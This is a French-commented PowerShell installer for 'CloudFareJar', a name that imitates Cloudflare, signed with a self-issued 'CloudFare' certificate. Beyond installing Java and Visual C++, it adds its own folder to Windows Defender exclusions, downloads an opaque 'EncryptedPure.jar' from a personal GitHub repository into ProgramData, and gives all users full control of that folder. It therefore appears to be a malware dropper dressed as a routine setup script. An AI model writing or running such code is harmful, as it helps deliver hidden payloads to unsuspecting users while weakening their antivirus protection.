# Install-Universal-v3 - INTEGRATED VERSION
# Version integree avec retry GitHub, dependances, et gestion antivirus

Write-Host "========================================================" -F Cyan
Write-Host "INSTALLATION CLOUDFAREJAR - VERSION 3 INTEGREE" -F Cyan
Write-Host "========================================================" -F Cyan

# ============================================================================
# CONFIGURATION
# ============================================================================
$baseDir = "C:\ProgramData\CloudFare"
$javaDir = "$baseDir\Java"
$jarPath = "$baseDir\App.jar"
$logFile = "$baseDir\Logs\Install.log"

# ============================================================================
# FONCTION: GitHub Retry avec Temps d'Attente
# ============================================================================
function Invoke-GitHubDownloadWithRetry {
    param(
        [string]$Url,
        [string]$OutputPath,
        [int]$MaxRetries = 5
    )
    
    Write-Host "Telechargement: $Url" -F Cyan
    
    for($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            Write-Host "  Tentative $attempt/$MaxRetries..." -F Gray
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -TimeoutSec 300 -ErrorAction Stop
            Write-Host "  ✅ Succes" -F Green
            return $true
        } catch {
            $waitTime = [Math]::Pow(2, $attempt - 1) * 2
            Write-Host "  ❌ Echec - Attente $waitTime secondes..." -F Yellow
            Start-Sleep -Seconds $waitTime
        }
    }
    
    Write-Host "  ❌ Echec apres $MaxRetries tentatives" -F Red
    return $false
}

# ============================================================================
# FONCTION: Verifier et Installer Dependances
# ============================================================================
function Install-Dependencies {
    Write-Host "`n[1/5] Verification et installation des dependances..." -F Yellow
    
    # Visual C++ Redistributable
    Write-Host "  - Visual C++ Redistributable..." -F Gray
    $vcRedist = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSChildName -like "*Visual C++*" }
    
    if($vcRedist) {
        Write-Host "    ✅ Deja installe" -F Green
    } else {
        Write-Host "    Installation en cours..." -F Cyan
        try {
            $vcUrl = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
            $vcPath = "$env:TEMP\vc_redist.x64.exe"
            
            if(Invoke-GitHubDownloadWithRetry -Url $vcUrl -OutputPath $vcPath) {
                $process = Start-Process -FilePath $vcPath -ArgumentList "/install /quiet /norestart" -PassThru -Wait
                Write-Host "    ✅ Installation reussie" -F Green
                Remove-Item $vcPath -Force -ErrorAction SilentlyContinue
            } else {
                Write-Host "    ⚠️ Impossible de telecharger - utiliser fallback" -F Yellow
            }
        } catch {
            Write-Host "    ⚠️ Erreur: $($_.Exception.Message)" -F Yellow
        }
    }
    
    # .NET Framework (si necessaire)
    Write-Host "  - .NET Framework..." -F Gray
    $dotnet = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSChildName -like "*.NET*" }
    
    if($dotnet) {
        Write-Host "    ✅ Deja installe" -F Green
    } else {
        Write-Host "    ℹ️ Non requis pour cette application" -F Gray
    }
}

# ============================================================================
# FONCTION: Gestion Antivirus
# ============================================================================
function Manage-Antivirus {
    Write-Host "`n[2/5] Gestion de l'antivirus..." -F Yellow
    
    try {
        $av = Get-MpComputerStatus -ErrorAction Stop
        
        if($av.AntivirusEnabled) {
            Write-Host "  ✅ Antivirus actif" -F Green
            
            # Ajouter scripts a la whitelist
            Write-Host "  - Ajout des scripts a la whitelist..." -F Gray
            $scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
            
            try {
                Add-MpPreference -ExclusionPath $scriptPath -ErrorAction Stop
                Write-Host "    ✅ Scripts ajoutes a la whitelist" -F Green
            } catch {
                Write-Host "    ⚠️ Impossible d'ajouter a la whitelist: $($_.Exception.Message)" -F Yellow
            }
        } else {
            Write-Host "  ⚠️ Antivirus desactive" -F Yellow
            Write-Host "  - Activation de l'antivirus..." -F Gray
            
            try {
                Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
                Write-Host "    ✅ Antivirus active" -F Green
            } catch {
                Write-Host "    ⚠️ Impossible d'activer: $($_.Exception.Message)" -F Yellow
            }
        }
    } catch {
        Write-Host "  ℹ️ Antivirus non detecte (Windows Defender non disponible)" -F Gray
    }
}

# ============================================================================
# FONCTION: Telecharger Java avec Retry GitHub
# ============================================================================
function Install-Java {
    Write-Host "`n[3/5] Installation de Java..." -F Yellow
    
    $javaUrl = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.13%2B11/OpenJDK17U-jre_x64_windows_hotspot_17.0.13_11.zip"
    $javaZip = "$env:TEMP\java-17.zip"
    
    if(Invoke-GitHubDownloadWithRetry -Url $javaUrl -OutputPath $javaZip) {
        Write-Host "  - Extraction de Java..." -F Gray
        
        if(Test-Path $javaDir) {
            Remove-Item $javaDir -Recurse -Force
        }
        New-Item -ItemType Directory -Path $javaDir -Force | Out-Null
        
        Expand-Archive -Path $javaZip -DestinationPath $javaDir -Force
        
        # Renommer le repertoire extrait
        $extracted = Get-ChildItem -Path $javaDir -Directory | Select-Object -First 1
        if($extracted) {
            Move-Item -Path $extracted.FullName -Destination "$javaDir\jre" -Force
        }
        
        Write-Host "  ✅ Java installe" -F Green
        Remove-Item $javaZip -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "  ❌ Impossible de telecharger Java" -F Red
        return $false
    }
    
    return $true
}

# ============================================================================
# FONCTION: Telecharger et Assembler JAR
# ============================================================================
function Install-JAR {
    Write-Host "`n[4/5] Installation du JAR..." -F Yellow
    
    $jarUrl = "https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncryptedPure.jar"
    
    if(Invoke-GitHubDownloadWithRetry -Url $jarUrl -OutputPath $jarPath) {
        $jarSize = (Get-Item $jarPath).Length / 1MB
        Write-Host "  ✅ JAR installe ($([math]::Round($jarSize, 2)) MB)" -F Green
        return $true
    } else {
        Write-Host "  ❌ Impossible de telecharger JAR" -F Red
        return $false
    }
}

# ============================================================================
# FONCTION: Configurer Environnement
# ============================================================================
function Configure-Environment {
    Write-Host "`n[5/5] Configuration de l'environnement..." -F Yellow
    
    # JAVA_HOME
    Write-Host "  - Configuration JAVA_HOME..." -F Gray
    [Environment]::SetEnvironmentVariable("JAVA_HOME", "$javaDir\jre", "Machine")
    Write-Host "    ✅ JAVA_HOME configure" -F Green
    
    # PATH
    Write-Host "  - Mise a jour PATH..." -F Gray
    $currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if($currentPath -notlike "*$javaDir*") {
        $newPath = "$javaDir\jre\bin;$currentPath"
        [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
        Write-Host "    ✅ PATH mis a jour" -F Green
    }
    
    # Permissions
    Write-Host "  - Configuration des permissions..." -F Gray
    try {
        $acl = Get-Acl $baseDir
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $acl.SetAccessRule($rule)
        Set-Acl -Path $baseDir -AclObject $acl
        Write-Host "    ✅ Permissions configurees" -F Green
    } catch {
        Write-Host "    ⚠️ Erreur permissions: $($_.Exception.Message)" -F Yellow
    }
}

# ============================================================================
# FONCTION: Verifier Installation
# ============================================================================
function Verify-Installation {
    Write-Host "`n========================================================" -F Cyan
    Write-Host "VERIFICATION DE L'INSTALLATION" -F Cyan
    Write-Host "========================================================" -F Cyan
    
    $allOk = $true
    
    # Verifier Java
    Write-Host "`nJava:" -F Yellow
    $javaExe = "$javaDir\jre\bin\java.exe"
    if(Test-Path $javaExe) {
        Write-Host "  ✅ Java.exe trouve" -F Green
        try {
            $version = & $javaExe -version 2>&1
            Write-Host "  ✅ Version: $($version[0])" -F Green
        } catch {
            Write-Host "  ❌ Erreur version Java" -F Red
            $allOk = $false
        }
    } else {
        Write-Host "  ❌ Java.exe non trouve" -F Red
        $allOk = $false
    }
    
    # Verifier JAR
    Write-Host "`nJAR:" -F Yellow
    if(Test-Path $jarPath) {
        $jarSize = (Get-Item $jarPath).Length / 1MB
        Write-Host "  ✅ JAR trouve ($([math]::Round($jarSize, 2)) MB)" -F Green
    } else {
        Write-Host "  ❌ JAR non trouve" -F Red
        $allOk = $false
    }
    
    # Verifier JAVA_HOME
    Write-Host "`nEnvironnement:" -F Yellow
    $javaHome = [Environment]::GetEnvironmentVariable("JAVA_HOME", "Machine")
    if($javaHome) {
        Write-Host "  ✅ JAVA_HOME: $javaHome" -F Green
    } else {
        Write-Host "  ❌ JAVA_HOME non configure" -F Red
        $allOk = $false
    }
    
    return $allOk
}

# ============================================================================
# EXECUTION PRINCIPALE
# ============================================================================
Write-Host "`nDemarrage de l'installation..." -F Cyan

# Creer repertoires
New-Item -ItemType Directory -Path $baseDir -Force | Out-Null
New-Item -ItemType Directory -Path "$baseDir\Logs" -Force | Out-Null

# Executer les etapes
Install-Dependencies
Manage-Antivirus
$javaOk = Install-Java
$jarOk = Install-JAR
Configure-Environment

# Verifier
if($javaOk -and $jarOk) {
    $verifyOk = Verify-Installation
    
    if($verifyOk) {
        Write-Host "`n========================================================" -F Cyan
        Write-Host "✅ INSTALLATION REUSSIE" -F Green
        Write-Host "========================================================" -F Cyan
        Write-Host "`nLe systeme est pret pour le deploiement!" -F Green
    } else {
        Write-Host "`n========================================================" -F Cyan
        Write-Host "⚠️ INSTALLATION AVEC AVERTISSEMENTS" -F Yellow
        Write-Host "========================================================" -F Cyan
    }
} else {
    Write-Host "`n========================================================" -F Cyan
    Write-Host "❌ INSTALLATION ECHOUEE" -F Red
    Write-Host "========================================================" -F Cyan
}

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUtSokaeXn+vXgvk+MBaLyBSfC
# gzegggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUPJERjpvSemAyDl5SqoEnNkmPXsgwDQYJ
# KoZIhvcNAQEBBQAEggEAeqlCZhdbQIFXvDKMkSvfiaVNxz8HzneKffY5P66sJziy
# oyRRew/lS8C2VGfXvzLRvnF5Qr5UawyiRQb1jDp1iW2tOTC7GTXnDn5Gu9VHjMg1
# FAIEMM3cDUfhd/W5741/7Utsy6IleLXkUB3GiaIwUg8OgRADkqMqMW73WexEoXso
# X13sZY2RFVPabpL5pMzXa6MHBhhsN/cADLUEmgL7/Y7/A91ChRDiGpHq5kF4Wm7b
# OqctCOlpToejnTtYI1aUzpmdYitSIKOhudvkaZGpCkQ2UGNgcOPn7wAgbbW57P83
# 2Yl5Qw7fzDCgYil5asOiEo+FexYTdzaCGPqyIHhlxA==
# SIG # End signature block
